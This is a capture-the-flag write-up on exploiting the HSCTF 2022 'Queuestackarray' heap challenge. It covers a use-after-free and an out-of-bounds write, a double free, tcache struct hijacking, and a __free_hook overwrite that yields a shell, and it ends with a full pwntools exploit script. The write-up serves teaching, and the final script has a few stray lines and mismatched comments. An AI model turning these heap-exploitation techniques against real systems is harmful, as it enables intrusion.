---
layout: post
title: "Queuestackarray: fun with data structures"
---

## Overview
Queuestackarray was the only pwn challenge at HSCTF 2022. It was a heap pwn challenge with a unique data structure. Unlike most pwn challenges, the organizers decided to provide the source code
for the binary. <br>
_NOTE_ this article assumes previous familiarity with how the glibc heap works.
### What's a Queuestack?

Analyzing the source, we find that the program centers around a data structure called `Queuestack`: <br>
~~~c
typedef struct Queuestack {
  char* cards[6];
  int head, tail;
} Queuestack;
~~~
Each `Queuestack` operates on an array of 6 strings. When the program wants to create a new string in a `Queuestack`, it passes the contents of the string to one of the push* functions. A new chunk
is allocated, the contents is written onto the chunk, and a pointer to that chunk is stored in the array:
~~~c
  int len = strlen(content);
  char* card = malloc(len+1);
  q->cards[(q->head - 1) % 6] = card;
  q->head--;
  strncpy(card, content, len);
  card[len] = '\0';
~~~
The program also has the option of freeing up some space in a Queuestack by popping a chunk off the stack. In that case, Queuestack invokes `free()` on the last chunk it allocated.
~~~ c
free(q->cards[(q->tail-1) % 6]);
~~~
`Queuestack` implements a bidirectional stack. Chunks can be written starting from the head(front of the `cards` array) or the tail(back of the `cards` array). 
The first chunk that is allocated will be the last chunk to be freed. Separate variables are used to keep track of where the head and tail of the array are located. 
As each `card` array initially has no chunks, `head` and `tail` initially hold the value of 0.

### The overall program

The program creates an array of 4 queuestacks, and then allows the user to input commands to modify the queuestacks. 5 commands are provided:
#### pushleft
Allows the user to allocate new chunks starting from the front of the array.
#### pushright
Allows the user to allocate new chunks starting from the back of the array.
#### popleft
Allows the user to free new chunks starting from the front of the array.
#### popright
Allows the user to free new chunks starting from the back of the array
#### examine
Allows the user to examine the contents of a chunk
<br>
The format of a command is roughly:
~~~
<command><number of the queuestack you want to modify> <any additional information needed>
~~~
For example, if I wanted to pop the first chunk in queuestack 1, I'd give the program the following command:
~~~
popleft1
~~~
## The Vulnerability
There are 2 vulnerabilities that I exploited. The first is a use-after-free. The program doesn't delete the pointer to a chunk in a queuestack after it is freed.
~~~c
void popright(Queuestack* q) {
  if (q->head == q->tail) {
    puts("Queuestack is empty");
    return;
  }
  free(q->cards[(q->tail-1) % 6]);
  //the pointer to the chunk in the array isn't deleted
  q->tail--;
}
~~~ 
The second is an Out Of Bounds (OOB) write. The program determines which index it should allocate new chunks in by dividing the `head` or `tail` of the `queuestack` by 6 and taking the remainder.
~~~c
void pushleft(Queuestack* q, char* content) {
  //omitted
  char* card = malloc(len+1);
  q->cards[(q->head - 1) % 6] = card; //q->head % 6
  q->head--;
  //omitted
}

~~~
~~~c
void pushright(Queuestack* q, char* content) {
  //omitted
  char* card = malloc(len+1);
  q->cards[(q->tail) % 6] = card; // q->tail % 6
  q->tail++;
  //omitted
}
~~~
Taking the remainder ensures that we won't be able to write past the `cards` array in a Queuestack. But what if `head` or `tail` is negative? A close look at the code for `pushleft()` reveals two things:
1. The program doesn't check that `head` is greater than 0 before using its value
2. Every time a new chunk is allocated via `pushleft()` head is decremented by 1

The value of `head` for every Queuestack is initially 0. So if we call `pushleft()` on a Queuestack before doing anything else, we can set the value of `head` to -1. The modulo of a negative
number is a negative number, so subsequent calls to `pushleft()` will write to the negative index of the `cards` array. That means that we can write to data located before the start of `cards`.
## The Exploit
We have a vulnerability! Two, in fact. The challenge description informs us that the program runs on Ubuntu 20.04. Ubuntu 20.04 uses some variant of glibc version 2.31, 
so we'll have to deal with additional mitigations that make it harder to exploit tcache chunks. Here's a great [explanation](https://faraz.faith/2019-10-12-picoctf-2019-heap-challs/#zero_to_hero) detailing
the mitigation in question. The only practical implication that it has for the exploit is that we'll need to fill up the tcache bin first before we trigger a double-free. <br>

### Heap Leak

First, we need to get a heap leak. Queuestack doesn't remove the pointer to a chunk from its 'cards' array after it is freed. After a tcache-sized chunk is freed, it goes into the tcache bin
for its size. If it isn't the only chunk in its bin, then a pointer to the next chunk in the tcache free list will be stored in its first 8 bytes. Therefore, we can free 2 chunks of the same
size, and leak a heap pointer by examining one of those chunks.
~~~python
    #first get a heap leak:
    pushright(1, "A"*0x10)
    pushright(1, "B"*0x10)
    popright(1)
    popright(1)
    examine(1,1) #examine the first chunk in queuestack 1
~~~
The address that we obtain from this leak is NOT the address of the heap base. Rather, it is the address of the next chunk in the tcache free list for chunks that are ~0x20 bytes long.
That chunk is around 0x3b0 bytes away from the heap base. Therefore, we read the address, unpack it, and then subtract the offset.
~~~python
heap_base = u64(sock.recvuntil(">")[0:6] + bytes.fromhex("0000")) - 0x3b0
~~~

### Libc leak

After we get a heap leak, we'll want a libc leak. Typically, the strategy for getting a heap leak in these challenges is to free a smallbin or largebin chunk. The chunk will be sent
to the unsorted bin by glibc. As a result, its first 16 bytes will be populated with pointers to libc. We can then read that chunk to get a libc leak. However, in this case, the program
only lets us input 80 bytes at most in one command:
~~~c
while (1) {
    printf("> ");
    fgets(input, 80, stdin);
//rest omitted
~~~
The size of the chunks that the target allocates is dependent on the size of the content that we want to store:
~~~c
//rest omitted
  int len = strlen(content); //size depends on content
  char* card = malloc(len+1);
  q->cards[(q->tail) % 6] = card;
~~~
The smallest smallbin chunk is much larger than 80 bytes! Therefore, we won't be able to get a libc leak by freeing a chunk that we allocated. We'll have to be much trickier.
At this point, we have 2 options:
1. Try to forge a large enough chunk on the heap, free it, and then read from it
2. Get a pointer to prethread_tcache_struct, free it, and then read from it

Looking back, option 1 would probably be easier, but I decided to go with option 2.

### Freeing prethread_tcache_struct

Any chunk that isn't a largebin chunk initially goes to the tcache bin for its size when it is freed, instead of the unsorted bin, even if it is a smallbin chunk. The only way to circumvent
this is by filling up the tcache bin for the smallbin chunk we want to free beforehand. If the tcache bin for the smallbin chunk that is freed is full, then the smallbin chunk will
be sent to the unsorted bin. Every tcache bin can hold 7 chunks at most. However, prethread_tcache_struct is around 0x290 bytes long, and we can't allocate any chunks that are
0x290 bytes long. So how are we going to fill up the 0x290 tcache bin??? 
<br> <br>
All details about the tcache bins are stored on the heap in prethread_tcache_struct, including the number of chunks in each tcache bin. If we can write to an arbitrary location
in prethread_tcache_struct, then we can set the number of chunks in the 0x290 tcache bin to 7 (thereby filling up the bin) without freeing any chunks. After filling up the 0x290 tcache bin, 
we can free prethread_tcache_struct and it'll go to the unsorted bin.

### First write to prethread_tcache_struct

We'll write to prethread_tcache_struct by leveraging the two vulnerabilities mentioned earlier. We'll leverage the OOB write by continuously calling `pushleft()` on one of the queuestacks. This
will set head to a negative number, which means that we'll be writing to the `cards` array right before the current queuestack. <br>
~~~
|---------------------------------
|	Head < 0		\	 |
|	queuestack n		\	 |
|				\	 |
| -------------------------------	 |
| 				\	\/
|				\	pushleft() on queuestack n writes
|	queuestack n-1		\	to the cards array of queuestack n-1
|-------------------------------
~~~
The end result is that certain pointers in queuestack n-1 will be accessible from both queuestack n and queuestack n-1. Therefore, we can call `popleft()` on queuestack n to free a pointer
in queuestack n-1, and then call `popleft`/`popright` on queuestack n-1 to free that same pointer again. We use the OOB write and UAF to create a double-free primitive.
keep in mind that the `head` and `tail` of each `Queuestack` is stored after the cards array.
~~~
| -------------------------------	 
| head				\	
| tail				\
| cards				\	
|	queuestack n-1		\
|-------------------------------
~~~
In order to pull off our double free, we need to invoke `pushleft` enough times such that we can write to the cards array of a queuestack from another queuestack. Remember that every time `pushleft`
is called, it'll store a pointer to a new chunk at `cards[head]` before decrementing `head`.
That means that executing our double free will force us to overwrite `head` and `tail` of another queuestack.
~~~
|---------------------------------
|	Head < 0		\	 |
|	queuestack n		\	 |
|				\	 |
| -------------------------------	 |
| head				\	\/
|tail				\	can't reach cards[] without
| cards				\	overwriting head and tail
|	queuestack n-1		\	
|-------------------------------
~~~
The value of `tail` and `head` influences what index of the `cards` array `popright()` and `popleft()` (respectively) free. We need to know what index of the `cards` array would first be popped
by queuestack n-1 to know exactly how many times we need to call `pushleft()` on queuestack n. We'll be using queuestacks 3 & 4 for the exploit(n = 4). However, we do know that we'll
need to call pushleft at least 2 times to get to the end of the cards[] array.
~~~python
    for i in range(2) :
        pushleft(4, ("A"*0x40))
~~~
`head` and `tail` will have been overwritten by the address of the first chunk we allocated through `pushleft()` on queuestack 4. We have a heap leak, so we can calculate the exact value of this
address.
~~~python
tail_addr = heap_base + 0x490 
~~~
`head` and `tail` are integers, which are 4 bytes long, and we want the value of tail in this instance. `tail` is located after `head`, so we'll isolate the upper 4 bytes of the address.
~~~python
tail_addr = tail_addr >> 32
~~~
`popright()` will take the modulo of `tail` by 6 and use that as the index in the `cards` array.
~~~c
free(q->cards[(q->tail-1) % 6]);
~~~
Therefore, to get the index of the `cards` array that will first be freed by `popright()` after our write, we'll take the modulo of `tail_addr`
~~~python
predicted_tail = tail_addr % 6
~~~
Here's the overall code to predict which index `popright()` will free:
~~~python
    #calculate where tail for queuestack 3 is:
    tail_addr = heap_base + 0x490 #addr that we overwrite tail + head with
    tail_addr = tail_addr >> 32 #remember that ints are only 4 bytes long!
    print("tail addr: " + hex(tail_addr))
    predicted_tail = tail_addr % 6
    print("predicted tail: " + str(predicted_tail))
~~~
(printfs are unnecessary and were just there to help me debug the exploit)
In order to pull off the double-free successfully, we need to make sure that the head pointer for queuestack 4 is in the same position as the tail pointer for queuestack 3.
However, remember that every time `pushleft()` is called, a new chunk will be allocated. Heap addresses are randomized, so the location that `popright()` will first free will also
be randomized, and we'll have to call `pushleft()` a different number of times on each run of the exploit. This makes the exploit more unstable. Instead, we'll decrement `tail` of queuestack 3
using `popright()` until `tail` is equal to 0.
~~~python
    #first move it down to 0:
    for i in range(predicted_tail):
        popright(3)
~~~
The `cards` array of queuestack 3 is initially just 0s, and freeing 0 does nothing. Next, we'll allocate chunks in queuestack 3 until `tail` == 4
~~~python
    #then alloc 4 more chunks:
    for i in range(4):
        pushright(3, "AAAAAAA")
~~~
This way, `tail` in queuestack 3 will always be set to the same value and we'll allocate the same number of chunks on every iteration of the exploit. Now we'll move `head` of queuestack 4 down
to the head that `tail` is currently at.
~~~python
    #now move the head for queuestack 4 down to 3:
    for i in range(3) :
        pushleft(4, "DDDDDD")
~~~
Now we're almost ready to perform a double free! Here's the full exploit code that was required to set up the double-free:
~~~python
    #next move head for queuestack 4 to overwrite queuestack 3
    for i in range(2) :
        pushleft(4, ("A"*0x40))
    #calculate where tail for queuestack 3 is:
    tail_addr = heap_base + 0x490 #addr that we overwrite tail + head with
    tail_addr = tail_addr >> 32 #remember that ints are only 4 bytes long!
    print("tail addr: " + hex(tail_addr))
    predicted_tail = tail_addr % 6
    print("predicted tail: " + str(predicted_tail))
    #move the tail for queue stack 3 down to 3:
    #first move it down to 0:
    for i in range(predicted_tail):
        popright(3)
    #then alloc 4 more chunks:
    for i in range(4):
        pushright(3, "AAAAAAA")
    #now move the head for queuestack 4 down to 3:
    for i in range(3) :
        pushleft(4, "DDDDDD")
~~~
Glibc added some new mitigations in glibc version 2.29 that prevent us from doing a double-free on freed chunks that are in the tcache bin. However, each tcache bin can only hold
7 chunks at most. After a tcache bin is filled up, any additional chunks that would go to that bin would go to either the fastbin or the unsorted bin. In our case, those chunks would go to the fastbin.
The fastbin doesn't have as robust protections against double-free attacks. However, if we free a fastbin chunk back-to-back, glibc will still detect it. It won't detect the double-free if we free
a different chunk before freeing the chunk again. So, prior to setting up queuestack 4 and queuestack 3 to do the double-free, let's allocate 8 chunks in queuestack 1 and queuestack 2.
7 to fill up the tcache bin, and 1 so that glibc won't detect our double free.
~~~python
    #first build a base to fill up tcache:
    for i in range(6) :
        pushright(1, "AAAAAA")
    pushright(2, "AAAAAA")
    pushright(2, "decoyaa")
~~~python
Right before executing the double-free, we'll free all 7 chunks to fill up the tcache bin for 0x20 long chunks.
~~~
    #now fill up tcache:
    for i in range(6):
        popright(1)
    popright(2)
~~~
Now we'll execute the double-free.
~~~python
    #now free the last chunk we alloced:
    popright(3)
    #free a decoy chunk so glibc doesn't get suspicious:
    popright(2)
    #free the last chunk again:
    popleft(4)
~~~
Now to actually get a pointer to prethread_tcache_struct, we'll need to re-gain access to the chunk that we double-freed and write the address of prethread_tcache_struct to its `next` pointer(first 8 bytes).
There's currently 7 chunks ahead of the chunk we double-freed in the tcache bin, so alloc 7 chunks to get them off the free list:
~~~python
    #get our free chunk to the top of the free list::
    for i in range(6) :
        pushright(1, "AAAAAA")
    pushright(2, "AAAAAA")
~~~
The chunk we double-freed is at the top of the free list. We'll write the address of prethread_tcache_struct to it to link prethread_tcache_struct to the free list. Then we'll allocate chunks until
we receive a pointer to prethread_tcache_struct. After gaining control of prethread_tcache_struct, write 0x0707070707070707 to it to create the illusion that tcache bin 0x290 is full. <br>
Note that the target expects all input to be strings. As such, it will cut off input when it first encounters a null byte. An address typically contains a null byte in it, so this means
that we can only write one address at a time. Furthermore, the target sets the last byte of each card to a null byte. This would set the last byte of our address to 0x0, corrupting the address.
Therefore, we include a dummy byte at the end of the address for the target to set to a null byte so that it doesn't damage the actual address.
~~~python
    #calc addr of index for 0x290 chunks in prethread_tcache_struct 
    bin_290 = heap_base+0x48
    #overwrite the free chunk to link bin_290:
    #add an extra byte after the original addr bc the chall bin will set the last byte of our card to 0
    bin_290 = bin_290 | padding
    pushright(4, p64(bin_290))
    #get control of bin 290:
    pushright(2, "BBBB")
    pushright(2, "BBBB")
    #alloc and overwrite to be full:
    pushright(2, p64(0x0707070707070707))
~~~

### Free prethread_tcache_struct

In order to free prethread_tcache_struct we'll first obtain a pointer to one of the queuestacks. We'll free one of the `cards` arrays, which will lead glibc to write a pointer to prethread_tcache_struct
into the array. We can then call `popright()`/`popleft()` on the queuestack that uses that `cards` array to free prethread_tcache_struct.
First we'll reset `head` of queuestack 4 and `tail` of queuestack 3 to point at the same location again.
~~~python
    #this is mainly to reset tail & head for queues 3 & 4 back to where they were:
    pushright(3, ("A" * 0x20))
    pushleft(4, "CCCCCC")
~~~
Then we'll get a pointer to one of the `cards` array in the same way that we got a pointer to prethread_tcache_struct, just without all the fancy setup of queuestack 3 and queuestack 4 beforehand.
We'll be freeing the `cards` array of queuestack 2.
~~~python
    #now fill tcache up again!
    for i in range(6): 
        popright(1)
    #start popping from the start of 4 so as not to free the invalid pointer in prethread
    popleft(2)
    #pop off 1:
    popright(3)
    #pop a decoy off 4:
    popleft(2)
    #next trigger the double-free:
    popleft(4)
    #clear out tcache:
    for i in range(6):
        pushright(1, p64((heap_base+0x80) | padding))
    pushleft(2, p64((heap_base +0x80) | padding))
    #next overwrite to addr of queuestackarray 2:
    qstack2 = heap_base + 0x2d0
    qstack2 = qstack2 | padding
    pushright(2, p64(qstack2))
    #get a pointer to qstack2
    #write to 3
    pushright(3, p64(qstack2))
    pushright(3, p64(qstack2))
    #write addr of qstack2 to qstack 4:
    qstack2 = heap_base + 0x350
    pushright(4, p64(qstack2 | padding))
    #now free qstack2:
    popright(4)
    #free prethread_tcache_struct:
    popleft(2)
~~~
prethread_tcache_struct has been freed and is now in the unsorted bin. A pointer to prethread_tcache_struct is still in queuestack 2, so we can read it and get a libc leak
~~~python
    examine(2, 2)
    libc_base = u64(sock.recv()[0:6] + bytes.fromhex("0000")) - 0x1ECBE0
~~~

### The final stretch: writing to __free_hook

Consider the implications of adding one of the `cards` arrays to the free list. The first 8 bytes (or the first slot) of the array will be treated as the `next' pointer.
We can still write chunks to that slot because the `cards` array is linked to the `Queuestack` struct for queuestack 2, even after the array has been freed. As part of clearing out
the tcache bin to get a pointer to the `cards` array, we allocated a chunk in the first slot of queuestack 2:
~~~python
    pushleft(2, p64((heap_base +0x80) | padding))
~~~ 
That chunk will now be linked on the free list, and as such the pointer that is in its first 8 bytes will also be linked onto the free list. We set the first 8 bytes of this chunk
to the tcache entry for the 0x20 bin in prethread_tcache_struct so that after we free prethread_tcache_struct, we'll be able to write to the tcache entry. <br>
The head(or first chunk) of each tcache bin is stored in prethread_tcache_struct. When a program requests a chunk that has a size that places it in a tcache bin, glibc checks if that
tcache bin is empty. If it isn't, glibc returns the first chunk in that tcache bin to satisfy the request. Therefore, we can get a pointer to an arbitrary location by
overwrite the head of a tcache bin in prethread_tcache_struct. We want to overwrite __free_hook, so we'll overwrite the head to the address of __free_hook. Before that, there is still one chunk
on the free list before prethread_tcache_struct, so we'll allocate an extra chunk to move prethread_tcache_struct to the front of the free list.
~~~python
    #alloc until we get to tcache_prethread_struct then write free_hook
    pushleft(4, "/bin/sh")
    free_hook = libc_base + 0x1eee48
    #write free_hook:
    pushright(2, p64(free_hook | padding))
~~~
After that we'll alloc another chunk and write the address of system to __free_hook.
~~~python
    #write system to free_hook:
    system = libc_base + 0x52290
    pushright(2, p64(system | padding))
~~~
We previously allocated a chunk at the head of queuestack 4 and stored the string "/bin/sh" in it. If we call `free()` on that chunk then we'll get a shell.
~~~python
    #call free on /bin/sh:
    popleft(4)
    sock.interactive()
~~~

## The final exploit

Here's the final exploit, complete with some boilerplate and extra comments:
~~~ python
#!/usr/bin/python3

from pwn import *

exe = ELF("./queuestackarray")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.terminal = ["xfce4-terminal", "--execute"]
context.binary = exe
args.LOCAL = True
args.DEBUG = True

def conn():
	if args.LOCAL:
		tempsock = process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
		gdb.attach(tempsock, ''' set disable-randomization off ''')
		return tempsock
	else:
		return remote("queuestackarray.hsctf.com", 1337)

sock = conn()

#basic interface:
def popleft(qstack) :
    sock.sendlineafter("> ", ("pop" + str(qstack)))
def popright(qstack) :
    sock.sendlineafter("> ", ("popright" + str(qstack)))
def pushleft(qstack, content) :
    if isinstance(content, str) :
        content = content.encode()
    sock.sendlineafter("> ", ("pushleft".encode() + str(qstack).encode() + " ".encode() + content))
def pushright(qstack, content) :
    if isinstance(content, str) :
        content = content.encode()
    sock.sendlineafter("> ", ("push".encode() + str(qstack).encode() + " ".encode() + content))
def examine(qstack, card) :
    sock.sendlineafter("> ", ("examine" + str(qstack) + str(card)))
def main():
    padding = 0x0055000000000000 #padding that we need to add for target to not cut off the addr
    #first get a heap leak:
    pushright(1, "A"*0x10)
    pushright(1, "B"*0x10)
    popright(1)
    popright(1)
    examine(1,1)
    heap_base = u64(sock.recvuntil(">")[0:6] + bytes.fromhex("0000")) - 0x3b0
    sock.sendline("examine11")
    #trigger a double-free:
    #first build a base to fill up tcache:
    for i in range(6) :
        pushright(1, "AAAAAA")
    pushright(2, "AAAAAA")
    pushright(2, "decoyaa")
    #next move head for queuestack 4 to overwrite queuestack 3
    for i in range(2) :
        pushleft(4, ("A"*0x40))
    #calculate where tail for queuestack 3 is:
    tail_addr = heap_base + 0x490 #addr that we overwrite tail + head with
    tail_addr = tail_addr >> 32 #remember that ints are only 4 bytes long!
    predicted_tail = tail_addr % 6
    #move the tail for queue stack 3 down to 3:
    #first move it down to 0:
    for i in range(predicted_tail):
        popright(3)
    #then alloc 4 more chunks:
    for i in range(4):
        pushright(3, "AAAAAAA")
    #now move the head for queuestack 4 down to 3:
    for i in range(3) :
        pushleft(4, "DDDDDD")
    #now fill up tcache:
    for i in range(6):
        popright(1)
    popright(2)
    #now free the last chunk we alloced:
    popright(3)
    #free a decoy chunk so glibc doesn't get suspicious:
    popright(2)
    #free the last chunk again:
    popleft(4)
    #get our free chunk to the top of the free list::
    for i in range(6) :
        pushright(1, "AAAAAA")
    pushright(2, "AAAAAA")
    #calc addr of index for 0x290 chunks in prethread_tcache_struct
    bin_290 = heap_base+0x48
    #overwrite the free chunk to link bin_290:
    #add an extra byte after the original addr bc the chall bin will set the last byte of our card to 0
    bin_290 = bin_290 | padding
    pushright(4, p64(bin_290))
    #get control of bin 290:
    pushright(2, "BBBB")
    pushright(2, "BBBB")
    #alloc and overwrite to be full:
    pushright(2, p64(0x0707070707070707))
    #alloc another chunk in 1 to double-free again:
    #this is mainly to reset tail & head for queues 1 & 2 back to where they were:
    pushright(3, ("A" * 0x20))
    pushleft(4, "CCCCCC")
    #now fill tcache up again!
    for i in range(6): 
        popright(1)
    #start popping from the start of 4 so as not to free the invalid pointer in prethread
    popleft(2)
    #pop off 1:
    popright(3)
    #pop a decoy off 4:
    popleft(2)
    #next trigger the double-free:
    popleft(4)
    #clear out tcache:
    for i in range(6):
        pushright(1, p64((heap_base+0x80) | padding))
    pushleft(2, p64((heap_base +0x80) | padding))
    #next overwrite to addr of queuestackarray 2:
    qstack2 = heap_base + 0x2d0
    qstack2 = qstack2 | padding
    pushright(2, p64(qstack2))
    #get a pointer to qstack2
    #write to 1
    sock.interactive()
    pushright(3, p64(qstack2))
    pushright(3, p64(qstack2))
    #write addr of qstack2 to qstack 4
    qstack2 = heap_base + 0x350
    pushright(4, p64(qstack2 | padding))
    #now free qstack2:
    popright(4)
    #free prethread_tcache_struct:
    popleft(2)
    #get a libc leak :) :)
    examine(2, 2)
    libc_base = u64(sock.recv()[0:6] + bytes.fromhex("0000")) - 0x1ECBE0
    print("leak? " + hex(libc_base))
    sock.sendline("examine22")
    #alloc until we get to tcache_prethread_struct then write free_hook
    pushleft(4, "/bin/sh")
    free_hook = libc_base + 0x1eee48
    #write free_hook:
    pushright(2, p64(free_hook | padding))
    #write system to free_hook:
    system = libc_base + 0x52290
    pushright(2, p64(system | padding))
    #call free on /bin/sh:
    popleft(4)
    sock.interactive()

main()
~~~

## Conclusion

A LOT of pain and suffering was left out of this writeup. Getting the exploit to work on remote was a nightmare, as was negotiating with the queuestack data structure. However, overall, I liked
this challenge. 
